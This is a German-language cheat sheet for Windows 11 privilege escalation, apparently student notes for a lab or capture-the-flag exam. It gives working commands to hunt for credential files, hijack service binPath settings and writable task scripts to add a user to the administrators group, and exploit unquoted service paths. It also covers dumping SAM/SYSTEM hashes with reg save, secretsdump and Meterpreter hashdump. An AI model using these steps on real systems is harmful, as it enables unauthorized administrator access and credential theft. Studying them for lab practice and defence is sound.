# 🪟 Windows PrivEsc — Windows 11

> Reihenfolge: **Kontext → Hinweise/History → Services/Tasks manuell → PrivescCheck → Hashes/Backups → Flag lesen**.

## 1. Kontext und Benutzer

```cmd
whoami
whoami /priv
whoami /groups
hostname
ipconfig
net user
net localgroup
systeminfo
```

PowerShell:

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroup -SID 'S-1-5-32-544'     # lokalisierter Name der Administrator-Gruppe
Get-LocalGroupMember (Get-LocalGroup -SID 'S-1-5-32-544').Name
```

> **Anpassen:** Windows kann die Gruppe `Administrators` oder `Administratoren` nennen. In Befehlen `<ADMIN_GROUP>` durch den tatsächlichen Namen ersetzen.

## 2. Hinweise, History und App-Daten

```powershell
# PowerShell-History
$hist = (Get-PSReadLineOption).HistorySavePath
$hist
Get-Content $hist -EA SilentlyContinue

# User-Verzeichnisse und versteckte Dateien
Get-ChildItem C:\Users -Force
Get-ChildItem C:\Users -Recurse -Force `
  -Include *.txt,*.log,*.xml,*.ini,*.config,*.json,*.bak,*.old,*.zip,*.kdbx,*.pdf `
  -EA SilentlyContinue

# Nach Credential-/Backup-Begriffen suchen
Get-ChildItem C:\Users -Recurse -File -EA SilentlyContinue |
  Select-String -Pattern 'pass|pwd|user|login|admin|key|token|secret|backup|cred' `
  -EA SilentlyContinue
```

App-spezifisch prüfen:

```powershell
Get-ChildItem C:\Users\<USER>\AppData\Roaming -Force -EA SilentlyContinue
Get-ChildItem C:\Users\<USER>\AppData\Local   -Force -EA SilentlyContinue
Get-ChildItem C:\Users\<USER>\Documents       -Force -EA SilentlyContinue
```

> **Hinweis Prof:** Eine Userin kann eine Anwendung benutzt und darin Hinweise hinterlegt haben. Konfiguration, Logs, Sessions und Notizen im Benutzerprofil prüfen.

## 3. Flags und relevante Dateien

```cmd
# Zuerst typische Flag-Pfade
where /r C:\Users user.txt 2>nul
where /r C:\Users root.txt 2>nul
type C:\Users\<USER>\Desktop\user.txt 2>nul
type C:\Users\Administrator\Desktop\root.txt 2>nul

# Danach gezielt nach Loot suchen
where /r C:\Users *backup* 2>nul
where /r C:\Users *.kdbx 2>nul
where /r C:\ SAM 2>nul
where /r C:\ SYSTEM 2>nul
```

PowerShell, zunächst nur Benutzerprofile:

```powershell
Get-ChildItem C:\Users -Recurse -Force -EA SilentlyContinue `
  -Include user.txt,root.txt,*backup*,*.kdbx,SAM,SYSTEM
```

> Eine vollständige Rekursion über `C:\` kann langsam sein. Erst typische Pfade und Benutzerprofile prüfen.

## 4. PrivescCheck — nach manuellen Checks

```powershell
powershell -ep bypass
. .\PrivescCheck.ps1
Invoke-PrivescCheck
Invoke-PrivescCheck -Report PrivescReport -Format TXT
```

Wichtige Funde:

```text
Services - Permissions / ChangeConfig / writable binary
Scheduled Task mit beschreibbarer Action
Unquoted Service Path
Autologon / Credential files
AlwaysInstallElevated
```

> Als aktueller Low-Priv-User ausführen; einige Checks sind kontextabhängig. Nicht nur Ergebnis kopieren: Dienst/Task, ausführenden Benutzer, Pfad und eigene Schreibrechte manuell bestätigen.

---

## 5. Services — drei Prüfungswege

### 5.1 Zuerst Dienst verstehen

```cmd
sc.exe query <SERVICE>
sc.exe qc <SERVICE>
sc.exe sdshow <SERVICE>
```

PowerShell-Übersicht, auch wenn `wmic` auf Windows 11 fehlt:

```powershell
Get-CimInstance Win32_Service |
  Select-Object Name,StartName,State,StartMode,PathName
```

Fragen:

```text
1. Läuft der Dienst als LocalSystem/Administrator?
2. Kann ich Service-Konfiguration ändern?
3. Kann ich Binary, Script oder einen Ordner im Pfad beschreiben?
4. Kann ich den Dienst starten/neustarten oder wird er automatisch gestartet?
```

### 5.2 Schwache Service-ACL / `binPath` ändern

Rechte mit AccessChk prüfen, falls vorhanden:

```cmd
accesschk.exe /accepteula -ucqv <USER> <SERVICE>
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

Bei `SERVICE_CHANGE_CONFIG`/`AllAccess`:

```cmd
sc.exe qc <SERVICE>
sc.exe config <SERVICE> binPath= "C:\Windows\System32\cmd.exe /c net localgroup <ADMIN_GROUP> <USER> /add"
sc.exe stop <SERVICE>
sc.exe start <SERVICE>
net localgroup <ADMIN_GROUP>
```

- Leerzeichen nach `binPath=` ist bei `sc.exe` erforderlich.
- Fehler `1053` kann erwartet sein; der eingebettete Befehl kann bereits als LocalSystem gelaufen sein.
- `<USER>` und lokalisierten `<ADMIN_GROUP>` ersetzen.

### 5.3 Beschreibbare Service-Datei oder Script

Pfad aus `sc.exe qc`/`PathName` übernehmen:

```cmd
icacls "C:\Path\service.exe"
icacls "C:\Path"
```

Bei `.bat`, `.cmd` oder `.ps1`:

```powershell
Add-Content 'C:\Path\task-or-service.ps1' `
  'net localgroup <ADMIN_GROUP> <USER> /add'
```

Bei beschreibbarer `.exe`:

```text
Original sichern → passende Windows-x64-EXE erzeugen/kompilieren → Datei ersetzen
→ Dienst neu starten → Ergebnis prüfen
```

Payload muss zu OS/Architektur und Listener passen: [msfvenom](../../99-Resources/msfvenom.md).

### 5.4 Unquoted Service Path

Finden:

```powershell
Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '^"' } |
  Select-Object Name,StartName,PathName
```

Beispiel:

```text
C:\Program Files\Vuln Service\service.exe
Windows versucht unter Umständen zuerst C:\Program.exe.
```

Dann Schreibrechte auf die möglichen Zwischenpfade prüfen:

```cmd
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Vuln Service"
```

Nur ausnutzbar, wenn ein passender früherer Pfad beschreibbar ist **und** der Dienst neu gestartet wird.

---

## 6. Scheduled Tasks

Auflisten:

```cmd
schtasks /query /fo LIST /v
```

Gezielt in PowerShell:

```powershell
Get-ScheduledTask | Select-Object TaskName,TaskPath,State
$t = Get-ScheduledTask -TaskName '<TASK>'
$t.Principal
$t.Actions
$t.Triggers
```

Prüfen:

```text
Run As User / Principal → SYSTEM oder Admin?
Execute + Arguments → welches Binary/Script?
Trigger → wann läuft es?
```

Rechte auf Action und Elternordner:

```cmd
icacls "C:\Path\script.ps1"
icacls "C:\Path"
```

Wenn Script beschreibbar:

```powershell
Add-Content 'C:\Path\script.ps1' `
  'net localgroup <ADMIN_GROUP> <USER> /add'
```

Task auslösen, wenn erlaubt, sonst Trigger abwarten:

```cmd
schtasks /run /tn "<TASK>"
net localgroup <ADMIN_GROUP>
```

---

## 7. SAM/SYSTEM und Meterpreter `hashdump`

Wenn du bereits ausreichende Rechte besitzt:

```cmd
mkdir C:\Temp 2>nul
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

Auf Kali:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

Meterpreter:

```text
getuid
getprivs
hashdump
```

`hashdump` benötigt normalerweise erhöhte Rechte und liefert **lokale NTLM-Hashes**. Diese sind von NetNTLMv2-Challenge-Responses zu unterscheiden und können abhängig vom Dienst für PtH verwendet werden.

## 8. Backups / KeePass / Klartext

```powershell
Get-ChildItem C:\ -Recurse -Force -EA SilentlyContinue `
  -Include *backup*,*.bak,*.old,*.zip,*.kdbx,*.pdf,*.pcap*
```

Dann offline: `zip2john`, `keepass2john`, `pdf2john`, PCAP/Notizen/Bilder prüfen.

## 9. Nur erhöhte Leserechte? Flag direkt testen

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Proof:

```cmd
hostname & whoami & whoami /priv & type C:\Users\Administrator\Desktop\root.txt
```

> **Hinweis Prof:** Eine perfekte Admin-/SYSTEM-Shell ist nicht zwingend. Wenn der Exploit die benötigten Rechte liefert, `root.txt` lesen und sauber dokumentieren.
